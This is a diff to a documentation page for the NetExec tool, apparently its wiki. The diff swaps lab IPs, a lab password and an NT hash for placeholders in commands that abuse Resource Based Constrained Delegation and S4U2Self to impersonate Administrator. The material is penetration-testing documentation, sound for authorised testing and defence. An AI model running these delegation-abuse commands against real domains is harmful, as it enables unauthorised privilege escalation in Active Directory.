@@ -9,7 +9,7 @@ description: Resource Based Constrained Delegation (RBCD) and
 If you have an object with the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute set to an account you control you can use the impersonate flag inside NetExec to automatically execute the Resource Based Constrained Delegation and impersonate any user:
 
 ```bash
-nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
+nxc smb $TARGET -u $USER -p $PASSWORD --delegate Administrator
 ```
 
 <figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>RBCD with NetExec</p></figcaption></figure>
@@ -19,7 +19,7 @@ nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
 If you have a computer account you can (nearly) always get local administrator with the s4u2self extension:
 
 ```bash
-nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self
+nxc smb $TARGET -u $USER -H $NT_HASH --delegate Administrator --self
 ```
 
 <figure><img src="../../.gitbook/assets/self (2).png" alt=""><figcaption><p>S4U2Self abuse using NetExecs delegation feature</p></figcaption></figure>
